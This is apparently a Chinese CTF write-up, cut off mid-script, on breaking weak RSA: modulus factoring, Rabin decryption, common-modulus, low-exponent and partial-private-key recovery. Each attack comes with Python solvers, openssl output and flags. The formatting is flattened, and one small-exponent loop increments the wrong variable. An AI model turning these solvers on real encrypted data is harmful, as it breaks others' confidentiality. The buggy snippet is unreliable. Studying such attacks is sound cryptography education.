    <content type="text"><![CDATA[爆破分解模数N方法介绍 n比较小的话，可以手写脚本进行爆破 1234567#coding=utf-8for i in range(2,n): if(n%i == 0): p = i q = n/i break n比较大的话，可以使用一些攻击进行暴力破解，如RSATool或者yafu yafu提取码：9qtg RSATool提取码：502a 一个在线分解大素数的网站：http://factordb.com,这个网站只能分解已经存在分解过的模数n值 题目积累Rabin算法 基本知识 hardRSA——Jarvis OJ加压后发现两个文件，一个公钥，一个enc文件 使用openssl查看 1234openssl rsa -in pubkey.pem -pubin -text -modulus#下面是显示RSA Public-Key: (256 bit) Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 (0x2) Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgEC -----END PUBLIC KEY----- 典型的rabin加密，使用模块叫脚本即可： 12345678910111213141516171819202122232425262728#coding=utf-8import stringfrom Crypto.Util.number import long_to_bytesimport gmpydef rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) #整除 ⽤// mq = pow(c, (q + 1) / 4, q) yp = gmpy.invert(p, q) yq = gmpy.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss)with open('flag.enc', 'r') as f: c = f.read().encode('hex') c = string.atoi(c, base=16)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = p*q temp = rabin_decrypt(c,p,q,2)for i in temp: print(long_to_bytes(i))#PCTF&#123;sp3ci4l_rsa&#125; 共模攻击（Common Modulus Attack) 使用相同的模数n,但是使用了不同的公钥e加密同一明文信息，且公钥中e1,e2应该互质。 方法 结论：当n不变的情况下，知道n,e1,e2,c1,c2 可以在不知道d1,d2情况下，解出m。 证明 由RSA基本原理可知：$$\begin{array}{*{20}{l}} { \left{ \begin{array}{{20}{c}}{c_1 = m^{e_1}\ mod\ n }\{c_2 = m^{e_2}\ mod\ n}\\end{array}\right. }\\end{array}$$由于e1与e2互质，由贝祖等式可知，必有s1,s2满足：$$e_1s_1+e_2*s_2 = 1$$s1,s2皆为整数，但是一正一负，我们可以通过扩展欧几里得算法计算s1,s2 所以：$$(c_1^{s_1}c_2^{s_2})\ mod\ n = (m^{e_1s_1}m^{e_2s_2})\ mod\ n =m\ mod\ n$$ 题目积累very hard RSA解压下来有三个文件，两个enc文件，和一个加密的python脚本 12345678910111213141516171819202122232425262728#veryhrdrsa.py#!/usr/bin/env pythonimport randomN = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929Ldef pad_even(x): return ('', '0')[len(x)%2] + xe1 = 17e2 = 65537fi = open('flag.txt','rb')fo1 = open('flag.enc1','wb')fo2 = open('flag.enc2','wb')data = fi.read()fi.close()while (len(data)&lt;512-11): data = chr(random.randint(0,255))+datadata_num = int(data.encode('hex'),16)encrypt1 = pow(data_num,e1,N)encrypt2 = pow(data_num,e2,N)fo1.write(pad_even(format(encrypt1,'x')).decode('hex'))fo2.write(pad_even(format(encrypt2,'x')).decode('hex'))fo1.close()fo2.close() 通过算法很容易知道是共模攻击，所以我们不需要的得到密钥d就可以进行解密： 这里出现了一个问题，就是使用gmpy无法进行解密，可能是我脚本写的有问题，目前没有找到解决方案。 12345678910111213141516171819202122import gmpy2from Crypto.Util import numberN = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929with open('flag.enc1', 'rb') as f: c1 = number.bytes_to_long(f.read()) with open('flag.enc2', 'rb') as f: c2 = number.bytes_to_long(f.read())e1 = 17e2 = 65537print(c1)_, s1, s2 = gmpy2.gcdext(e1, e2)if(s1 &lt; 0): s1 = -s1 c1 = gmpy2.invert(c1,N)if(s2 &lt; 0): s2 = -s2 c2 = gmpy2.invert(c2,N)res = (pow(c1, s1, N) * pow(c2,s2,N)) % Nprint(number.long_to_bytes(res))#PCTF&#123;M4st3r_oF_Number_Th3ory&#125; 低加密指数攻击基本理论 选择小的e可以缩短加密时间，但是选择的e不当，可能会造成严重的安全问题。在CTF题型中，这种攻击一般适用于e=3, 明文过小，导致明文的三次方还是小于n 123#此时只需要对密文开三次方即可import gmpy2gmpy2.iroot(c,e) 如果m稍微大一点，那么$$m^e = k*N + c$$ 我们可以对k进行枚举 1234567import gmpy2k = 0while 1: if(gmpy2.iroot(c+k*n,3)[1] == 1): print(gmpy2.iroot(c+k*n,3)) break i = i+1 题目积累Extremely hard RSA解压后发现两个文件，一个密文文件，一个公钥文件，同样使用openssl命令查看公钥信息 12345678root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop/RSA/extremelyhardRSA# openssl rsa -in pubkey.pem -pubin -text -modulus RSA Public-Key: (4096 bit) Modulus: 00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29 Exponent: 3 (0x3) Modulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM= -----END PUBLIC KEY----- 下面直接写脚本解密: ps:gmpy中求根号是gmpy.root gmpy2中求根号是gmpy2.iroot 123456789101112131415161718192021#coding=utf-8import gmpy2from Crypto.Util import numberwith open('flag.enc','rb') as f: c = number.bytes_to_long(f.read()) print(c)n = int('0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929',16)print(n)k = 0while 1: if(gmpy2.iroot(c+k*n,3)[1] == 1): m = gmpy2.iroot(c+k*n,3) print(m[0]) print(number.long_to_bytes(m[0])) break k = k + 1#PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125;#可能需要的时间有点长#看网上的wp，发现k&gt;118000000#可将k = 118000000加快速度 私钥恢复和最优非对称加密填充基本理论 私钥重构 题目积累GOD LIKE RSA解压之后，有三个文件，一个公钥文件，一个密文文件，一个损坏的私钥文件 查看公钥信息： 1RSA Public-Key: (4096 bit) Modulus: 00:c0:97:78:53:45:64:84:7d:8c:c4:b4:20:e9:33: 58:67:ec:78:3e:6c:f5:f0:5c:a0:3e:ee:dc:25:63: d0:eb:2a:9e:ba:8f:19:52:a2:67:0b:e7:6e:b2:34: b8:6d:50:76:e0:6a:d1:03:cf:77:33:d8:b1:e9:d7: 3b:e5:eb:1c:65:0c:25:96:fd:96:20:b9:7a:de:1d: bf:fd:f2:b6:bf:81:3e:3e:47:44:43:98:bf:65:2f: 67:7e:27:75:f9:56:47:ba:c4:f0:4e:67:2b:da:e0: 1a:77:14:40:29:c1:a8:67:5a:8f:f5:2e:be:8e:82: 31:3d:43:26:d4:97:86:29:15:14:a9:69:36:2c:76: ed:b5:90:eb:ec:6f:ce:d5:ca:24:1c:aa:f6:63:f8: 06:a2:62:cb:26:74:d3:5b:82:4b:b6:d5:e0:49:32: 7b:62:f8:05:c4:f7:0e:86:59:9b:f3:17:25:02:aa: 3c:97:78:84:7b:16:fd:1a:f5:67:cf:03:17:97:d0: c6:69:85:f0:8d:fa:ce:ee:68:24:63:06:24:e1:e4: 4c:f8:e9:ad:25:c7:e0:c0:15:bb:b4:67:48:90:03: 9b:20:7f:0c:17:eb:9d:13:44:ab:ab:08:a5:c3:dc: c1:98:88:c5:ce:4f:5a:87:9b:0b:bf:bd:d7:0e:a9: 09:59:81:fa:88:4f:59:60:6b:84:84:ad:d9:c7:25: 8c:e8:c0:e8:f7:26:9e:37:95:7c:e1:48:29:0f:51: e7:bd:98:2f:f6:cc:80:e7:f0:32:0b:89:51:92:4e: c2:6d:50:53:2b:3b:77:72:d1:bd:1a:1f:92:d7:12: 79:61:61:c5:a4:7e:b3:85:eb:f0:7c:6d:46:03:c5: e6:d5:81:2c:ba:7e:ea:8d:51:7d:63:55:34:2a:b6: d4:dc:31:5a:f1:99:e3:dc:8c:83:0b:a2:2a:d5:3c: 41:48:41:54:1a:a9:e8:b6:70:bf:d3:fe:ed:19:17: 14:94:13:b3:17:e3:8b:8e:6f:53:ed:e2:44:e8:4a: 32:d6:5c:0d:a8:80:f5:fc:02:e9:46:55:d5:a4:d3: e7:c6:30:77:f9:73:e9:44:52:d8:13:9d:5d:bf:9e: fa:3a:b5:96:79:82:5b:cd:19:5c:06:a9:00:96:fd: 4c:a4:73:88:1a:ec:3c:11:de:b9:3d:e0:50:00:1e: ac:21:97:a1:96:7d:6b:15:f9:6c:c9:34:7f:70:d7: 9d:2d:d1:48:4a:81:71:f8:12:dd:32:ba:64:31:60: 08:26:4b:09:22:03:83:90:17:7f:f3:a7:72:57:bf: 89:6d:e4:d7:40:24:8b:7b:bd:df:33:c0:ff:30:2e: e8:6c:1d Exponent: 65537 (0x10001) Modulus=C09778534564847D8CC4B420E9335867EC783E6CF5F05CA03EEEDC2563D0EB2A9EBA8F1952A2670BE76EB234B86D5076E06AD103CF7733D8B1E9D73BE5EB1C650C2596FD9620B97ADE1DBFFDF2B6BF813E3E47444398BF652F677E2775F95647BAC4F04E672BDAE01A77144029C1A8675A8FF52EBE8E82313D4326D49786291514A969362C76EDB590EBEC6FCED5CA241CAAF663F806A262CB2674D35B824BB6D5E049327B62F805C4F70E86599BF3172502AA3C9778847B16FD1AF567CF031797D0C66985F08DFACEEE6824630624E1E44CF8E9AD25C7E0C015BBB4674890039B207F0C17EB9D1344ABAB08A5C3DCC19888C5CE4F5A879B0BBFBDD70EA9095981FA884F59606B8484ADD9C7258CE8C0E8F7269E37957CE148290F51E7BD982FF6CC80E7F0320B8951924EC26D50532B3B7772D1BD1A1F92D712796161C5A47EB385EBF07C6D4603C5E6D5812CBA7EEA8D517D6355342AB6D4DC315AF199E3DC8C830BA22AD53C414841541AA9E8B670BFD3FEED1917149413B317E38B8E6F53EDE244E84A32D65C0DA880F5FC02E94655D5A4D3E7C63077F973E94452D8139D5DBF9EFA3AB59679825BCD195C06A90096FD4CA473881AEC3C11DEB93DE050001EAC2197A1967D6B15F96CC9347F70D79D2DD1484A8171F812DD32BA64316008264B0922038390177FF3A77257BF896DE4D740248B7BBDDF33C0FF302EE86C1D writing RSA key -----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAwJd4U0VkhH2MxLQg6TNY Z+x4Pmz18FygPu7cJWPQ6yqeuo8ZUqJnC+dusjS4bVB24GrRA893M9ix6dc75esc ZQwllv2WILl63h2//fK2v4E+PkdEQ5i/ZS9nfid1+VZHusTwTmcr2uAadxRAKcGo Z1qP9S6+joIxPUMm1JeGKRUUqWk2LHbttZDr7G/O1cokHKr2Y/gGomLLJnTTW4JL ttXgSTJ7YvgFxPcOhlmb8xclAqo8l3iEexb9GvVnzwMXl9DGaYXwjfrO7mgkYwYk 4eRM+OmtJcfgwBW7tGdIkAObIH8MF+udE0Srqwilw9zBmIjFzk9ah5sLv73XDqkJ WYH6iE9ZYGuEhK3ZxyWM6MDo9yaeN5V84UgpD1HnvZgv9syA5/AyC4lRkk7CbVBT Kzt3ctG9Gh+S1xJ5YWHFpH6zhevwfG1GA8Xm1YEsun7qjVF9Y1U0KrbU3DFa8Znj 3IyDC6Iq1TxBSEFUGqnotnC/0/7tGRcUlBOzF+OLjm9T7eJE6Eoy1lwNqID1/ALp RlXVpNPnxjB3+XPpRFLYE51dv576OrWWeYJbzRlcBqkAlv1MpHOIGuw8Ed65PeBQ AB6sIZehln1rFflsyTR/cNedLdFISoFx+BLdMrpkMWAIJksJIgODkBd/86dyV7+J beTXQCSLe73fM8D/MC7obB0CAwEAAQ== -----END PUBLIC KEY----- 模数n有4096bit，分解不太现实，所以目前还是使用损坏的私钥文件，修复脚本(具体也能在基本理论的链接中找到) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279#!/usr/bin/python3import refrom itertools import productfrom Crypto.Util.number import GCD, inversedef solve_linear(a, b, mod): if a &amp; 1 == 0 or b &amp; 1 == 0: return None return (b * inverse(a, mod)) &amp; (mod - 1) # 计算b*a^(-1)%moddef to_n(s): s = re.sub(r"[^0-9a-f]", "", s) return int(s, 16)def msk(s): cleaned = "".join(map(lambda x: x[-2:], s.split(":"))) #去掉冒号和多余字符和空格 return msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)def msk_ranges(s): # 求每一个半字节的取值范围 return [range(16) if c == " " else [int(c, 16)] for c in s] def msk_mask(s): return int("".join("0" if c == " " else "f" for c in s), 16)def msk_val(s): return int("".join("0" if c == " " else c for c in s), 16)N = to_n("""\00:c0:97:78:53:45:64:84:7d:8c:c4:b4:20:e9:33:58:67:ec:78:3e:6c:f5:f0:5c:a0:3e:ee:dc:25:63:d0:eb:2a:9e:ba:8f:19:52:a2:67:0b:e7:6e:b2:34:b8:6d:50:76:e0:6a:d1:03:cf:77:33:d8:b1:e9:d7:3b:e5:eb:1c:65:0c:25:96:fd:96:20:b9:7a:de:1d:bf:fd:f2:b6:bf:81:3e:3e:47:44:43:98:bf:65:2f:67:7e:27:75:f9:56:47:ba:c4:f0:4e:67:2b:da:e0:1a:77:14:40:29:c1:a8:67:5a:8f:f5:2e:be:8e:82:31:3d:43:26:d4:97:86:29:15:14:a9:69:36:2c:76:ed:b5:90:eb:ec:6f:ce:d5:ca:24:1c:aa:f6:63:f8:06:a2:62:cb:26:74:d3:5b:82:4b:b6:d5:e0:49:32:7b:62:f8:05:c4:f7:0e:86:59:9b:f3:17:25:02:aa:3c:97:78:84:7b:16:fd:1a:f5:67:cf:03:17:97:d0:c6:69:85:f0:8d:fa:ce:ee:68:24:63:06:24:e1:e4:4c:f8:e9:ad:25:c7:e0:c0:15:bb:b4:67:48:90:03:9b:20:7f:0c:17:eb:9d:13:44:ab:ab:08:a5:c3:dc:c1:98:88:c5:ce:4f:5a:87:9b:0b:bf:bd:d7:0e:a9:09:59:81:fa:88:4f:59:60:6b:84:84:ad:d9:c7:25:8c:e8:c0:e8:f7:26:9e:37:95:7c:e1:48:29:0f:51:e7:bd:98:2f:f6:cc:80:e7:f0:32:0b:89:51:92:4e:c2:6d:50:53:2b:3b:77:72:d1:bd:1a:1f:92:d7:12:79:61:61:c5:a4:7e:b3:85:eb:f0:7c:6d:46:03:c5:e6:d5:81:2c:ba:7e:ea:8d:51:7d:63:55:34:2a:b6:d4:dc:31:5a:f1:99:e3:dc:8c:83:0b:a2:2a:d5:3c:41:48:41:54:1a:a9:e8:b6:70:bf:d3:fe:ed:19:17:14:94:13:b3:17:e3:8b:8e:6f:53:ed:e2:44:e8:4a:32:d6:5c:0d:a8:80:f5:fc:02:e9:46:55:d5:a4:d3:e7:c6:30:77:f9:73:e9:44:52:d8:13:9d:5d:bf:9e:fa:3a:b5:96:79:82:5b:cd:19:5c:06:a9:00:96:fd:4c:a4:73:88:1a:ec:3c:11:de:b9:3d:e0:50:00:1e:ac:21:97:a1:96:7d:6b:15:f9:6c:c9:34:7f:70:d7:9d:2d:d1:48:4a:81:71:f8:12:dd:32:ba:64:31:60:08:26:4b:09:22:03:83:90:17:7f:f3:a7:72:57:bf:89:6d:e4:d7:40:24:8b:7b:bd:df:33:c0:ff:30:2e:e8:6c:1d""")p_ranges, pmask_msk, pmask_val = msk("""\ 0: e: : : :c :c : : : :b : : : : : :ab: e: 2: 8:c : : : 1:6 :6 : 6: f:d9: 0:8 :5c:7 :06: : : :0 : 3:5 :4b: :6 : : :2 : :6 : : : :2 :bc: c: :85:1 : 1:d : 3: 1:b4: : b: 1: 3: d:a : : :6e: 0:b :2 : : :b : :9 :e : :82:8d: : :13: : : a: a: : :4 : :c : f: : :7 :e :0a: : : b: 5: : e:91:3 : :3c: 9: : 6: : :b5:7d: 1: : : : :b :a1:99:6 :4 :3 :c :1a:02:4 : : 9:9 :f : d:bd: :0 : : : :b3: : 4: :e9: 9: : d: : :7 : :93: : e:dc: : 0: :e7: :e : :2 : b: 2:5 : : : : : c:5f: : :e2: : : 9: :2a: : e: : :2 : :9f: 7:3 : :b : f:b : : 8: 7: : :f :6 :e :c : :3 : :f7: 5: 8: 5: : : : : : 8: e: :03: c: :33:76:e : 1:7 : c: : 0: :0b: : a: : 2: 9: :c8:bf: : :06: 7:d5: :02: c:b :e2: 7:2 : : """)q_ranges, qmask_msk, qmask_val = msk("""\ 0: f: :d0: 1:55: 4:31: : b:c4:8 : : e: d:34: 3:f : : : : : 8:99:1 : : a:0 : :4 :0 : :f : :a4:41:2 : :a : : 1: : a: c: : : : 9: : : 2:f4: f: : : : :1 : 4:9 :a : : :79:0 : : : : : 2: 8:b : :4 : 8: :9b: 1: :d : :f :e4: :4 :c :e : :3 : : 7:2 : :d :8 :2 :7 : :d :67:fc:e : 0:f9: 7:8 : : : :1 :2f: :51: : :2e:0a: e:3d: 6:b : :dd: : 0:fb: :f4: : : :b4: 9:c : : a: : : :d : : :6b: 2: :9b: a:60: :d6: 0:4f:16:d1: : :5 :fc: :f : :8 : : : : 1: 6:e1:9 : e:4 : 6: c: d:d :73: 3: : :7 : :8 : 9: :3b:f : 2: : :f1: e: : :1e: :8 : : : 6:0 : 4:99:e : : 5: : : 4: : : : a:81:64: :7 :f : 9: d: :9 : : 7:93:f :ac:8c: : 8: : 0: d: 8: :7 : :1d: :f : :1 :a :6 :8 : :60: :b3: : : :89: : :14: :5 """)_, dmask_msk, dmask_val = msk("""\ : : : f:8 :a5:d : 2: 0:b :7 : : 1: : 4: 1:0d: :3 : :6 : : : b: : : :e : : :0e: 0:db: :1a:1c:c0: : e: : :99:bc:8 :a5:7 :7 :7 : b: : : 8: 8: :7 :55: 2: : :f :b2: : :b :f :4 : : 8: :b : : : : 0: :0 : :6 :9 : : : : b: 4: : 0: a: 5:07:b : 9: c:9a: 9: : 7:9e: : b:60:f : : : :0 : : 3:0 : : : : 1:b : : : b: 6:0 :f : : : 2:18: 6: b:1 : : : : :d3:f3: :a : : 3: : : : : 3: d: 1: 2:7 : : d: : 2: d: : : d:4 : :d : :6d: c:a :b6: : : : 1:69: : 7: :89: :c :8 :61: d:25: 3:7 :1b: 4:b : :8 :55: :49: 1:2 :3 : :1 :e9:a8: 3: :9 : : 1:f8:d3: :e : :d : :9 :b6: : :71:1 : :c1: : b: 1: : 6:e : :64: : :1a:c : : b: :bf:c : : 0: : 8:a :4 : :26:a :5 :6 : : : :eb: :e5: a: :3e:f9:10:0 : : : 6:0 : : 8: : 1:72: c:0 : f:5 : f:9c: 0: e: 7:b : : : : :d9: 4: : e:c :68: : : : c: :3a: : :a0:ea: 3: 4: :72:a :d : 8: : :0d:5 :0 : a: 7:c :bb: 6: 4:a :ce:d :2 : 1: : :17:6 : : c: b: : f: :3 : 5:6 :3 :0e: : 7:c :3e: 2: 9: 7: 6: f: e: f: 9: :f3: 9:a :c1:6 : : 1:9 : :43: : f: 5: :0 :27: 4:4 :a : :e9: : 8: 4:3 :8a: 6:16:d5:c : e: e: :d : c:b :a8: : 7: : 9: :7 :7d: : : : : : :4 :2 : : 3: 3: 6: : : :7b:0 : : e: :0 : :a : : 5: : : : 5:1 :82:c :0d:4 :2 :fd:36: 5:50:0 : : :d : f: 6: : :e :0 : : :ce: :9e:8 : :0 :d :07:b3: : : :0 :e4: : :68:b :c : : c:5 : : :3 : 7: 2: c:e0: :5 : : :b4: :ef: 7: :1 :e : 0:f : :6 : : : :e0:c :3 : : : 3: : d: : : 3: 3: c: a: :b : a:71: 3: 0:a : :4 :5d: :0 :4 """)_, dpmask_msk, dpmask_val = msk("""\ : 3:2a: : d: : : : :0 :1 : f: : : 6:1 :2 :1b:07: a:e :b :c5:58:7 : :e8: 7: 1: c: : 1:b :a0: 4:0f:5 :67: :3 :7 :6 :f9: : c: :79: 0:1 :65: :8 : :99: d:d : :2 :9 :0 : e: :0 : : : : d: :d :7 :6 :a9: a:8b: b: : : 7: a:37: : :7 :1 :6 : :c2: 7:6 :b : e: : : : : : :b :3a:5 : : : : : : : : :cd:8 : : d: :7 : 3: : f:e : c: : : a: :c : f:c : 7:b :5 : : :2 :8 :8 :6 :0a: a: : :3 :db: : 4:00: : d: :b : 5: :20: 2: 5: :82: : 0: 6: :8a: :7 : : 8: : 4: 1: : : : 8:46: : : : : : 0:f :c8:2 : : c:7 : : 1: : :2 : 0: 5: : : 1:9b: 6:9 : 0:74: :c : :e : : :cb:b 